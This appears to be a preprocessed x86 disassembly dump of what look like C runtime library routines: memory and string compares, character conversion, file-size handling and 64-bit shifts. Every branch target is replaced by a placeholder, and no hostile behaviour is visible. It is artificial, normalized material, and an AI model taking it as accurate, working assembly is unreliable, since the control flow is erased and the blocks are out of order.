jne r-xdata
movzx ecx [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
movzx edi [ esi + 0x9 ]
movzx eax [ edx + 0x9 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x7 ]
movzx eax [ edx + 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0xc ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xa ]
movzx eax [ edx + 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
movzx edi [ esi + 0xd ]
movzx eax [ edx + 0xd ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xb ]
movzx eax [ edx + 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx eax [ edx + 0x10 ]
movzx edi [ esi + 0x10 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xe ]
movzx eax [ edx + 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ edx + 0x14 ]
je r-xdata
movzx edi [ esi + 0x11 ]
movzx eax [ edx + 0x11 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xf ]
movzx eax [ edx + 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x14 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x12 ]
movzx eax [ edx + 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax [ edx + 0x18 ]
je r-xdata
movzx edi [ esi + 0x15 ]
movzx eax [ edx + 0x15 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x13 ]
movzx eax [ edx + 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x18 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x16 ]
movzx eax [ edx + 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x1c ]
cmp eax [ edx + 0x1c ]
je r-xdata
movzx edi [ esi + 0x19 ]
movzx eax [ edx + 0x19 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x17 ]
movzx eax [ edx + 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x1c ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x1a ]
movzx eax [ edx + 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
push 0x20
pop ecx
sub ebx ecx
add esi ecx
add edx ecx
cmp ebx ecx
jae r-xdata
movzx edi [ esi + 0x1d ]
movzx eax [ edx + 0x1d ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x1b ]
movzx eax [ edx + 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi + 0x1e ]
movzx eax [ edx + 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi + 0x1f ]
movzx eax [ edx + 0x1f ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
sub_41d2eb
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push esi
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_410368
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0xa8 ] esi
jne r-xdata
call sub_412060
push 0x16
pop esi
mov [ eax ] esi
call sub_412224
jmp r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
lea ecx [ ebp + 0xc ]
push ecx
push esi
push edi
push ebx
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push esi
mov [ ebp + 0xc ] esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov eax esi
pop esi
pop edi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_412060
mov [ eax ] 0x2a
call sub_412060
mov esi [ eax ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_412060
push 0x22
pop esi
mov [ eax ] esi
call sub_412224
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ eax ] ecx
jmp r-xdata
mov [ eax ] 0x1
jmp r-xdata
mov [ ebx ] al
push edi
push esi
push ebx
call sub_414c70
add esp 0xc
push edi
push esi
push ebx
call sub_414c70
add esp 0xc
sub_41d428
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_413a92
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_412060
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_412060
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_4134a1
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push edi
mov [ ebp + 0xc ] 0x2
call sub_414d00
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
lea eax [ edx + 0x2 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
sub ecx edx
sub eax 0x2
mov [ ebp + 0xc ] ecx
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_418c80
pop ecx
test eax eax
jne r-xdata
call sub_4134a1
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax cx
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_414d00
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_418cd4
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_413c4d
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov ecx edi
mov eax edi
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_41d588
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push 0x1
push esi
push esi
push edi
mov ebx esi
mov [ ebp - 0x8 ] esi
call sub_413d49
mov ecx edx
mov [ ebp - 0x18 ] eax
and eax ecx
add esp 0x10
mov [ ebp - 0x14 ] ecx
cmp eax 0xffffffff
je r-xdata
call sub_412060
mov eax [ eax ]
push 0x2
push esi
push esi
push edi
call sub_413d49
mov ecx eax
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
sub esi ecx
sbb eax edx
mov [ ebp - 0x4 ] eax
js r-xdata
test eax eax
jg r-xdata
jg r-xdata
push 0x0
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push edi
call sub_413d49
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
push 0x1000
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_413d49
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
test esi esi
jae r-xdata
push 0x8000
push edi
call sub_41d766
pop ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_412060
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push edi
call sub_41ae1e
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov ebx eax
mov eax edx
mov ecx ebx
and ecx eax
mov [ ebp - 0x8 ] eax
cmp ecx 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_412060
mov [ eax ] 0xd
call sub_41202c
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
call sub_41202c
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
mov eax [ ebp - 0x4 ]
sbb eax edx
mov [ ebp - 0x4 ] eax
js r-xdata
mov eax 0x1000
jmp r-xdata
cmp esi 0x1000
jb r-xdata
or ebx 0xffffffff
or [ ebp - 0x8 ] ebx
call sub_412060
mov [ eax ] 0xd
push [ ebp - 0x10 ]
push edi
call sub_41d766
pop ecx
pop ecx
push [ ebp - 0xc ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
jg r-xdata
push eax
push [ ebp - 0xc ]
push edi
call sub_414de2
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and ebx [ ebp - 0x8 ]
cmp ebx 0xffffffff
je r-xdata
test eax eax
jl r-xdata
test esi esi
je r-xdata
jmp r-xdata
sub_41d73c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn
call sub_412060
mov [ eax ] 0x16
call sub_412224
push 0x16
pop eax
pop ebp
retn
sub_41d766
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx esi
sar ebx 0x5
and esi 0x1f
shl esi 0x6
push edi
mov edi [ ebx * 4 + rw-data ]
mov cl [ edi + esi + 0x4 ]
movzx eax cl
and eax 0x80
mov [ ebp + 0x8 ] eax
mov al [ edi + esi + 0x24 ]
add al al
movsx edx al
mov eax [ ebp + 0xc ]
sar edx 0x1
cmp eax 0x4000
je r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov eax [ ebx * 4 + rw-data ]
and [ eax + esi + 0x24 ] 0x80
cmp eax 0x8000
je r-xdata
neg edx
sbb edx edx
and edx 0xc000
lea eax [ edx + 0x4000 ]
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and cl 0x7f
mov [ edi + esi + 0x4 ] cl
jmp r-xdata
cmp eax 0x10000
je r-xdata
cmp [ ebp + 0x8 ] 0x0
pop edi
pop esi
pop ebx
jne r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov ecx [ ebx * 4 + rw-data ]
mov al [ ecx + esi + 0x24 ]
and al 0x82
or al 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov [ ecx + esi + 0x24 ] al
jmp r-xdata
cmp eax 0x40000
jne r-xdata
or cl 0x80
mov [ edi + esi + 0x4 ] cl
mov ecx [ ebx * 4 + rw-data ]
mov al [ ecx + esi + 0x24 ]
and al 0x81
or al 0x1
sub_41d870
push ebx
push esi
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
test ebx 0xffffffff
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub ecx edx
test edx 0x3
je r-xdata
lea eax [ edx + ecx ]
and eax 0xfff
cmp eax 0xffc
ja r-xdata
movzx eax [ edx + ecx ]
cmp al [ edx ]
jne r-xdata
mov eax [ edx + ecx ]
cmp eax [ edx ]
jne r-xdata
sbb eax eax
or eax 0x1
pop esi
pop ebx
retn
test eax eax
cmove ebx eax
inc edx
sub ebx 0x1
jbe r-xdata
sub ebx 0x4
jbe r-xdata
test dl 0x3
jne r-xdata
lea esi [ eax - 0x1010101 ]
add edx 0x4
not eax
and eax esi
test eax 0x80808080
je r-xdata
sub_41d8e8
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d953
add esp 0x10
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
mov eax 0x7fffffff
jmp r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_41da10
call sub_412060
mov [ eax ] 0x16
call sub_412224
mov eax esi
jmp r-xdata
sub_41d953
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
leave
retn
push ebx
push esi
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_410368
mov edi [ ebp + 0x8 ]
mov esi 0x7fffffff
test edi edi
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx esi
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
sub edi ebx
push ecx
push ebx
push edi
call sub_41da10
add esp 0xc
mov esi eax
jmp r-xdata
sub esi eax
test esi esi
je r-xdata
cmp esi eax
je r-xdata
movzx eax [ edi + ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41055c
mov esi eax
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41055c
add esp 0x10
inc ebx
dec [ ebp + 0x10 ]
je r-xdata
sub_41da10
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_41da80
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_41daa0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_401000
mov eax [ esp + 0x8 ]
retn
sub_401005
cmp [ esp + 0x4 ] 0x0
jne r-xdata
jmp sub_403695
xor eax eax
retn
sub_401034
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax ecx
retn
push [ esp + 0x4 ]
call sub_403683
pop ecx
mov ecx eax
sub_40104a
test edx edx
jne r-xdata
mov eax [ esp + 0x4 ]
push edx
mov dx [ eax ]
call sub_40366a
pop ecx
retn
xor eax eax
retn
sub_401076
push edx
mov edx [ esp + 0x8 ]
call sub_403630
pop ecx
retn
sub_401082
mov ax [ edx ]
mov [ ecx ] ax
retn
sub_401089
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
lea edx [ eax + 0x1 ]
xor eax eax
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
retn
sub_4010a2
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
pop ebp
jmp sub_410c10
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_4010ca
mov eax [ esp + 0x8 ]
mov cl [ eax ]
mov eax [ esp + 0x4 ]
mov [ eax ] cl
retn
sub_4010d7
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
mov eax ecx
retn 0x4
sub_4010e2
mov [ ecx ] r--data
mov eax ecx
retn
sub_4010eb
mov [ ecx ] r--data
retn
sub_4010f2
xor eax eax
cmp ecx [ esp + 0x4 ]
sete al
retn 0x4
sub_4010fe
push esi
mov esi ecx
call sub_4010eb
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f402#2
pop ecx
sub_401121
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
mov eax [ esp + 0x8 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
retn 0x8
sub_401175
push ecx
push [ esp + 0xc ]
mov ecx [ esp + 0xc ]
call sub_401121
mov eax [ esp + 0x4 ]
retn 0x8
sub_4011db
push esi
mov esi ecx
call sub_4010e2
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_4011ed
mov eax r--data
retn
sub_40121e
push esi
mov esi ecx
call j_sub_4010eb#2
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f402#2
pop ecx
j_sub_4010eb#2
jmp sub_4010eb
sub_40123f
push esi
mov esi ecx
call sub_4011db
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_401251
mov eax r--data
retn
sub_401286
push esi
mov esi ecx
call j_sub_4010eb
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f402#2
pop ecx
j_sub_4010eb
jmp j_sub_4010eb#2
sub_4012a7
push esi
mov esi ecx
call sub_4011db
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_4012b9
mov eax r--data
retn
sub_401319
mov eax rw-data
retn
sub_40131f
mov eax rw-data
retn
sub_40135a
push 0x0
mov eax sub_41dbf0
call sub_411378
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
add ecx 0x4
call sub_402249
lea ecx [ ebp + 0x8 ]
call sub_40223f
call sub_411346
retn 0x18
sub_401386
push 0x0
mov eax sub_41dbf0
call sub_411378
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
add ecx 0x1c
call sub_402249
lea ecx [ ebp + 0x8 ]
call sub_40223f
call sub_411346
retn 0x18
sub_4013b2
push 0x0
mov eax sub_41dbf0
call sub_411378
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
add ecx 0x34
call sub_402249
lea ecx [ ebp + 0x8 ]
call sub_40223f
call sub_411346
retn 0x18
sub_4013de
push 0x0
mov eax sub_41dbf0
call sub_411378
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
add ecx 0x4c
call sub_402249
lea ecx [ ebp + 0x8 ]
call sub_40223f
call sub_411346
retn 0x18
sub_401471
push esi
mov esi ecx
call sub_401486
push esi
call j_sub_40f402#2
pop ecx
mov eax esi
pop esi
retn 0x4
sub_401f65
xor eax eax
mov [ ecx + 0x34 ] eax
mov [ ecx + 0x38 ] eax
mov [ ecx + 0x3c ] eax
mov [ ecx + 0x4c ] eax
retn 0x4
sub_401fa8
